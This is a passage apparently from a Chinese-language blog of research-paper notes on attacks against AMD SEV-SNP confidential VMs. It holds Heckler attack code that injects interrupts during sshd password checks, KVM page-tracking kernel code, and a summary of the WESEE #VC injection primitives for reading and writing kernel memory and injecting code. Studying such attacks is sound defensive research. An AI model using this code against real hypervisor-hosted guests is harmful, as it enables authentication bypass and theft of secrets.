class=\"keyword\">if</span> errors &gt; <span class=\"number\">300</span>:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(ev)</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(errors)</span><br><span class=\"line\">                        <span class=\"keyword\">break</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        h.heckler_ack_event()</span><br><span class=\"line\">                        acked = <span class=\"literal\">True</span></span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                gpa = <span class=\"built_in\">int</span>(ev.get(<span class=\"string\">&#x27;gpa&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">                track_again = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> lastlast_gpa != <span class=\"number\">0</span> <span class=\"keyword\">and</span> last_gpa != <span class=\"number\">0</span> <span class=\"keyword\">and</span> gpa != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    key = (lastlast_gpa, last_gpa, gpa)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> key <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> history:</span><br><span class=\"line\">                        history[key] = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    history[key] += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> history[key] &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\">                        track_again = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;sequence \\[<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(lastlast_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(last_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">for</span> gadgets <span class=\"keyword\">in</span> gadget_pairs:</span><br><span class=\"line\">                    mm_answer_authpassword = gadgets[<span class=\"number\">0</span>]</span><br><span class=\"line\">                    auth_password = gadgets[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># sequence of interest:</span></span><br><span class=\"line\">                    <span class=\"comment\"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> gpa == mm_answer_authpassword \\</span><br><span class=\"line\">                            <span class=\"keyword\">and</span> last_gpa == auth_password \\</span><br><span class=\"line\">                            <span class=\"keyword\">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class=\"line\">                              <span class=\"string\">f&quot;\\[<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(lastlast_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(last_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class=\"line\">                        h.heckler_inject(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> quit_after_one_inject:</span><br><span class=\"line\">                            self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> last_gpa != gpa <span class=\"keyword\">and</span> last_gpa != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> track_again:</span><br><span class=\"line\">                        h.heckler_track_page(last_gpa)</span><br><span class=\"line\"></span><br><span class=\"line\">                lastlast_gpa = last_gpa</span><br><span class=\"line\">                last_gpa = gpa</span><br><span class=\"line\">                h.heckler_ack_event()</span><br><span class=\"line\">                acked = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> KeyboardInterrupt <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> acked:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                h.heckler_ack_event()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        h.heckler_untrack_all_pages()</span><br><span class=\"line\">        h.heckler_clean_up()</span><br><span class=\"line\">        self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>这里为什么又是三个连续的了？每次循环的GPA是否pc是连续的？ single step还是根据条件</p>\n<h3 id=\"track-page\"><a href=\"#track-page\" class=\"headerlink\" title=\"track page\"></a>track page</h3><p>user</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">track_page</span><span class=\"params\">(<span class=\"type\">usp_poll_api_ctx_t</span>* ctx, <span class=\"type\">uint64_t</span> gpa, <span class=\"keyword\">enum</span> kvm_page_track_mode mode)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">track_page_param_t</span> tp = &#123;</span><br><span class=\"line\">\t\t.gpa = gpa,</span><br><span class=\"line\">\t\t.track_mode = mode,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ioctl(ctx-&gt;kvm_fd, KVM_TRACK_PAGE, &amp;tp) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;track_page: Error calling KVM_TRACK_PAGE ioctl&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SEV_STEP_ERR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SEV_STEP_OK;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __ioctl_track_page(<span class=\"keyword\">struct</span> file *f, <span class=\"type\">void</span> *a) &#123;</span><br><span class=\"line\">    <span class=\"type\">track_page_param_t</span> p;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_vcpu</span> *<span class=\"title\">vcpu</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (copy_from_user(&amp;p, (<span class=\"type\">void</span> *)a, <span class=\"keyword\">sizeof</span>(p))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    pr_info(<span class=\"string\">&quot;tracking page %llx\\n&quot;</span>, p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class=\"line\">    vcpu = xa_load(&amp;heckler_config.main_vm-&gt;vcpu_array, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    __do_track_single_page(</span><br><span class=\"line\">        vcpu,</span><br><span class=\"line\">        p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// <span class=\"doctag\">XXX:</span> Add page to NX page_track tracking</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> __do_track_single_page(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gfn_t</span> gfn) &#123;</span><br><span class=\"line\">    <span class=\"type\">bool</span> ret;</span><br><span class=\"line\">    <span class=\"type\">int</span> idx;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">kvm_page_track_mode</span> <span class=\"title\">mode</span> =</span> KVM_PAGE_TRACK_EXEC;</span><br><span class=\"line\"></span><br><span class=\"line\">    idx = srcu_read_lock(&amp;vcpu-&gt;kvm-&gt;srcu);</span><br><span class=\"line\">    slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (slot != <span class=\"literal\">NULL</span> &amp;&amp;</span><br><span class=\"line\">        !kvm_slot_page_track_is_active(vcpu-&gt;kvm, slot, gfn, mode)) &#123;</span><br><span class=\"line\">        kvm_slot_page_track_add_page(vcpu-&gt;kvm, slot, gfn, mode);</span><br><span class=\"line\">        kvm_vcpu_exec_protect_gfn(vcpu, gfn, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        ret = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">kvm_vcpu_exec_protect_gfn</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 gfn, <span class=\"type\">bool</span> flush)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> protected;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tslot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class=\"line\">\tprotected = kvm_mmu_slot_gfn_protect(vcpu-&gt;kvm, slot, gfn, PG_LEVEL_4K, KVM_PAGE_TRACK_EXEC);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (flush &amp;&amp; protected) &#123;</span><br><span class=\"line\">\t\tkvm_flush_remote_tlbs(vcpu-&gt;kvm);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> protected;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">kvm_mmu_slot_gfn_protect</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm *kvm,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    <span class=\"keyword\">struct</span> kvm_memory_slot *slot, u64 gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    <span class=\"type\">int</span> min_level,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\t<span class=\"keyword\">enum</span> kvm_page_track_mode mode)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_rmap_head</span> *<span class=\"title\">rmap_head</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> protected = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_memslots_have_rmaps(kvm)) &#123; </span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i = min_level; i &lt;= KVM_MAX_HUGEPAGE_LEVEL; ++i) &#123;</span><br><span class=\"line\">\t\t\trmap_head = gfn_to_rmap(gfn, i, slot);</span><br><span class=\"line\">\t\t\tprotected |= __rmap_protect(kvm, rmap_head, <span class=\"literal\">true</span>, mode);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tWARN(is_tdp_mmu_enabled(kvm), <span class=\"string\">&quot;exec protect not supported with TDP MMU&quot;</span>);\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> protected;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> __rmap_protect(<span class=\"keyword\">struct</span> kvm *kvm,</span><br><span class=\"line\">\t\t\t\t <span class=\"keyword\">struct</span> kvm_rmap_head *rmap_head,</span><br><span class=\"line\">\t\t\t\t <span class=\"type\">bool</span> pt_protect, <span class=\"keyword\">enum</span> kvm_page_track_mode mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu64 *sptep;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rmap_iterator</span> <span class=\"title\">iter</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> flush = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfor_each_rmap_spte(rmap_head, &amp;iter, sptep)</span><br><span class=\"line\">\t\tflush |= spte_protect(sptep, pt_protect, mode);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flush;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">spte_protect</span><span class=\"params\">(u64 *sptep, <span class=\"type\">bool</span> pt_protect,</span></span><br><span class=\"line\"><span class=\"params\">\t<span class=\"keyword\">enum</span> kvm_page_track_mode mode)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu64 spte = *sptep;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> shouldFlush = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!is_writable_pte(spte) &amp;&amp;</span><br><span class=\"line\">\t    !(pt_protect &amp;&amp; is_mmu_writable_spte(spte)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\trmap_printk(<span class=\"string\">&quot;spte %p %llx\\n&quot;</span>, sptep, *sptep);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pt_protect)</span><br><span class=\"line\">\t\tspte &amp;= ~EPT_SPTE_MMU_WRITABLE;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(mode == KVM_PAGE_TRACK_WRITE) &#123;</span><br><span class=\"line\">\t\tspte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class=\"line\">\t\tshouldFlush = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>( mode == KVM_PAGE_TRACK_RESET_ACCESSED) &#123;</span><br><span class=\"line\">\t\tspte = spte &amp; ~PT_ACCESSED_MASK;</span><br><span class=\"line\">\t\tshouldFlush = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(mode == KVM_PAGE_TRACK_ACCESS) &#123;</span><br><span class=\"line\">\t\tspte = spte &amp; ~PT_PRESENT_MASK;</span><br><span class=\"line\">\t\tspte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class=\"line\">\t\tspte = spte &amp; ~PT_USER_MASK;</span><br><span class=\"line\">\t\tspte = spte | (<span class=\"number\">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT);</span><br><span class=\"line\">\t\tshouldFlush = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span>\t\t</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>( mode == KVM_PAGE_TRACK_EXEC) &#123;</span><br><span class=\"line\">\t\tspte = spte | (<span class=\"number\">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT); </span><br><span class=\"line\">\t\tshouldFlush = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (mode == KVM_PAGE_TRACK_RESET_EXEC) &#123;</span><br><span class=\"line\">\t\tspte = spte &amp; (~(<span class=\"number\">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT));</span><br><span class=\"line\">\t\tshouldFlush = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tprintk(KERN_WARNING <span class=\"string\">&quot;spte_protect was called with invalid mode&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;parameter %d\\n&quot;</span>,mode);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tshouldFlush |= mmu_spte_update(sptep, spte);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> shouldFlush;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>track_page的核心就是把present bit给清零 这样每次都会触发page fault</p>\n","categories":["papers"]},{"title":"WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP","url":"/2025/02/04/papers/WESEE/","content":"<h1 id=\"WESEE-Using-Malicious-VC-Interrupts-to-Break-AMD-SEV-SNP\"><a href=\"#WESEE-Using-Malicious-VC-Interrupts-to-Break-AMD-SEV-SNP\" class=\"headerlink\" title=\"WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP\"></a>WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP</h1><p>IEEE S&amp;P 2024</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjMyMzI3ZjhiYTRjYmU1M2U3MTM1MzIzNTBjZjgwNzdfRW5FMzNOSmlHUkRGQkdzSnpoVlVnSm9ZTG1ZRVBUUVNfVG9rZW46TDVKNmJtTHJIb25Wb1d4RkZXTGM0NXlmbmxmXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>Linux kernel作为最广泛使用的支持CVM的guest OS，攻击面仍然很大，通过精心利用某些漏洞（如恶意中断）可以完成端到端的攻击（root shell）。</p>\n<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25742\">&gt; CVE-2024-25742</a></p>\n<h2 id=\"Background：-VC-exception\"><a href=\"#Background：-VC-exception\" class=\"headerlink\" title=\"Background：#VC exception\"></a>Background：#VC exception</h2><h3 id=\"introduction\"><a href=\"#introduction\" class=\"headerlink\" title=\"introduction\"></a>introduction</h3><p>SEV-ES保护了寄存器，增加GHCB用于Guest-Host通信</p>\n<p>当发生某些vmexit时，hypervisor需要当前guest的寄存器信息为guest提供服务</p>\n<ul>\n<li>cpuid</li>\n<li>rdtsc</li>\n<li>MMIO</li>\n</ul>\n<p>引入#VC exception（中断号29） 便于拷贝相应的寄存器信息</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBiMjgyYzM4NWEyNDYzM2Q5YjNkN2MzY2ZjNWJiNmNfRXlZUXc3Vmo4cmlaYnBUZ3h2S0paYXJkemNyQUVUcHBfVG9rZW46TzlLdmJWczNmb013NE14ZGRqcWNNamZLbktjXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>exception_number和exit_reason可以由软件配置！</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">svm-&gt;vmcb-&gt;control.event_inj = user_data_npf_ex.exception_number | SVM_EVTINJ_VALID | SVM_EVTINJ_VALID_ERR | SVM_EVTINJ_TYPE_INTR;</span><br><span class=\"line\">svm-&gt;vmcb-&gt;control.event_inj_err = user_data_npf_ex.exception_error_code;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Simple-attack\"><a href=\"#Simple-attack\" class=\"headerlink\" title=\"Simple attack\"></a>Simple attack</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmVjZGJjM2RmNDU4MGFjZTZmNzUwMzc2ZDViOGQ1NjVfWEQ0QXBab0Z5aTUyaDBxa3JYYmF1YVIxRjhhQ25NRzVfVG9rZW46V0dJcGJKZTdEb0JqeUx4Z2d2YmNEdUFHbjFlXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFhZGRlODIxYWVhYTE0NjQ0OTE4N2ExMGU1ZjcxODNfWGo0cERFWVFQWUppVEN0THhZYjNuWEFiWTllMW1FMFRfVG9rZW46WTdxN2I2TnZob0dZZUJ4dDlWNWM3WWxZbnNiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<h3 id=\"VC-ability\"><a href=\"#VC-ability\" class=\"headerlink\" title=\"VC ability\"></a>VC ability</h3><ul>\n<li>Chaining multiple #VC</li>\n<li>Nesting #VC in non-critical section</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzk1NGJkYmM5N2Q5MGFmODhhNDhiZDRiZmQzZDBhNzhfQ0tlSE1ZMUg5YTlQV0k5dmdTZnVsVW1iYjRIOEtXUTVfVG9rZW46VDVSa2J4TThEb2hVUlV4NjQwN2N3Qk55bkw3XzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NzYxYTZkYzVlYWYxNzY0YjgzMzBhN2NmODQyY2I5YjlfeTF3TUZEYkx2NkVSa2sxdDFGM2V5OHdpS3NieW5CclpfVG9rZW46Vnc2VWJKZnIxb243VDB4MjJxOWNVSFFBbnBoXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>只用vmmcall和mmio read&#x2F;write 三种情况就可以构造足够强大的attack primitives</p>\n<h2 id=\"Attack-Primitives\"><a href=\"#Attack-Primitives\" class=\"headerlink\" title=\"Attack Primitives\"></a>Attack Primitives</h2><p>利用vanilla linux内vc_handler的处理逻辑配合恶意#VC中断实现更强大的功能。</p>\n<h3 id=\"Skip-Instructions\"><a href=\"#Skip-Instructions\" class=\"headerlink\" title=\"Skip Instructions\"></a>Skip Instructions</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTE1ZjViOTExZDljM2MzYmNmYmI3ZDcwNDBmNmU5YjJfWnM3WklhcXN6SmFudzJ6R2lnbHRteHNXV2M2ZzVtM0NfVG9rZW46WlNmbWJiOUZib0R1cTZ4dk1JMGNpcVBsbk5mXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>guest的VC handler根据hypervisor的处理结果：</p>\n<ul>\n<li>OK：增加rip（执行下一行指令）</li>\n<li>RETRY：不增加rip（重新执行一遍原指令）</li>\n</ul>\n<p>exit_reason为vmmcall，rax不进行修改，返回success</p>\n<p>记为S</p>\n<h3 id=\"Read-Write-Rax\"><a href=\"#Read-Write-Rax\" class=\"headerlink\" title=\"Read&amp;Write Rax\"></a>Read&amp;Write Rax</h3><ul>\n<li>exit_reason为vmmcall，rax进行修改，返回success-&gt;记为 WraxS</li>\n<li>利用nesting VC 跳过line8-line13，共15行汇编，(WraxS).15S &#x3D; Wrax</li>\n</ul>\n<h3 id=\"Reading-Kernel-Memory\"><a href=\"#Reading-Kernel-Memory\" class=\"headerlink\" title=\"Reading Kernel Memory\"></a>Reading Kernel Memory</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov [rdi], rbx</span><br></pre></td></tr></table></figure>\n\n<p>hypervisor需要rdi指向地址的值与rbx的值</p>\n<ul>\n<li>并不是直接mov rbx到GHCB，而是有另一块内存（context）进行中转</li>\n<li>中转的过程中会使用rax保存rbx的值所在的内存地址，然后用memcpy复制到GHCB</li>\n<li>利用Wrax修改rax指向guest secret va，memcpy会把secret 拷贝到GHCB暴露给hypervisor</li>\n<li>利用Wrax绕过后续的检查</li>\n</ul>\n<p>记为Rmem</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmFkYTlkZGJkZjA4YzFiZDA2ZTdmODMzZTA0NDIxZTJfOWVLZGd3cDlRV0M5YWV2NkdvcUVaR21HVGxlM1czTUNfVG9rZW46SnFHdmJqY216b0gzMEt4UDRIemN3aXRnbkhiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<h3 id=\"Writing-Kernel-Memory\"><a href=\"#Writing-Kernel-Memory\" class=\"headerlink\" title=\"Writing Kernel Memory\"></a>Writing Kernel Memory</h3><p>Wmem原理同Rmem</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov rbx, [rdi]</span><br></pre></td></tr></table></figure>\n\n<p>guest需要把hypervisor提供的值放到寄存器rbx中</p>\n<ul>\n<li>并不是直接把GHCB内存mov到rbx，而是有另一块内存（context）进行中转</li>\n<li>中转的过程中会使用rax保存rbx的值所在的内存地址，然后用memcpy复制到这块地址</li>\n<li>利用Wrax修改rax指向guest target va，memcpy会把hypervisor准备的恶意值拷贝到guest私有内存</li>\n<li>利用Wrax绕过检查</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA5YmNjNDUyYjQ1NmEyY2EyNjUyOTc4YzNiOWUxMGZfYkp2NEVuVUx5RmRFVHBmc2NVTG9sZ3hoSjFlZUViNDRfVG9rZW46S0JuTmJvWEpSb1o0NDd4MElnOWNzd3FpbnVkXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<h3 id=\"Arbitrary-Code-Injection\"><a href=\"#Arbitrary-Code-Injection\" class=\"headerlink\" title=\"Arbitrary Code Injection\"></a>Arbitrary Code Injection</h3><p>目标：往.text section注入恶意的shellcode</p>\n<ul>\n<li>提前静态分析，得到内核页表基地址所在地址（不考虑地址随机化的情况下）</li>\n<li>Rmem读出页表基地址（CR3的值），Wmem改页表权限</li>\n</ul>\n<h2 id=\"Problems-To-be-Solved\"><a href=\"#Problems-To-be-Solved\" class=\"headerlink\" title=\"Problems To be Solved\"></a>Problems To be Solved</h2><h3 id=\"Where-To-Inject-？\"><a href=\"#Where-To-Inject-？\" class=\"headerlink\" title=\"Where To Inject ？\"></a>Where To Inject ？</h3><p>绕过ASLR</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ODI1NDEwNDNhYWJhMDA0YjllMjBjMTFkN2VmOTJlOTNfOHhxSjJSRUlJZ3VLUzZVRThwTFZOdk9Hd28ydUZYTHFfVG9rZW46WDJjaGJNWUdGb2tLeE14TzRoN2NKcW1CbmhmXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<ul>\n<li>kernel在地址随机化之前，早期的地址是固定的。</li>\n<li>提前分析得出kernel在地址随机化之前的最后一个page地址 （0x7a753000）</li>\n<li>运行时，这个page之后的page地址就可以计算出随机的PKbase</li>\n</ul>\n<h3 id=\"When-To-Inject？\"><a href=\"#When-To-Inject？\" class=\"headerlink\" title=\"When To Inject？\"></a>When To Inject？</h3><ul>\n<li>离线采样得到page序列，同之前的攻击（Heckler等）</li>\n<li>运行时hypervisor修改stage2页表权限，通过page fault得到guest正在执行的page 序列</li>\n<li>直接通过guest的符号表可以找到函数对应的固定地址（同PKbase进行计算）</li>\n</ul>\n<h2 id=\"Case-studies\"><a href=\"#Case-studies\" class=\"headerlink\" title=\"Case studies\"></a>Case studies</h2><h3 id=\"Leaking-keys-from-Kernel-TLS\"><a href=\"#Leaking-keys-from-Kernel-TLS\" class=\"headerlink\" title=\"Leaking keys from Kernel TLS\"></a>Leaking keys from Kernel TLS</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWNiMGVhNjM3MWI0ODhhZmVhNzQwYjZlNzk3YjE5ZDVfT0pHdXQ2WFpJajZTOVgxRUV6M1VMam9QZDd0VmpIT2JfVG9rZW46WGtBSmJmNnh6b0xOdXB4bDhyV2Mxb01xbndiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<h3 id=\"Disabling-Firewall\"><a href=\"#Disabling-Firewall\" class=\"headerlink\" title=\"Disabling Firewall\"></a>Disabling Firewall</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTI3YzJlNWY5MTRkYThjYmFhMGI5ZTM3MGI0YzUxMzRfM1haVkVXbzlONnhsYTJhTEdGNE1QQTNqTTZuR0Z1eG9fVG9rZW46UnNjSWJDUTExb0VJVjV4QmxodWNacmpWbkZiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>改16bytes</p>\n<p><img 